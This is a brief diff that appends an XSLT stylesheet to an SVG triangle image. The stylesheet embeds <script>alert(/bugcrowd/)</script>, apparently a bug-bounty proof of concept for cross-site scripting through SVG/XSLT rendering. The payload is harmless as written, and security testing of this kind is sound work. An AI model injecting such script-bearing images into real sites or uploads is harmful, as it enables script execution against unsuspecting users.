@@ -4,3 +4,12 @@
  xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
 </svg>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+<xsl:template match="/">
+<html>
+<body>
+<script>alert(/bugcrowd/);</script>
+</body>
+</html>
+</xsl:template>
+</xsl:stylesheet>
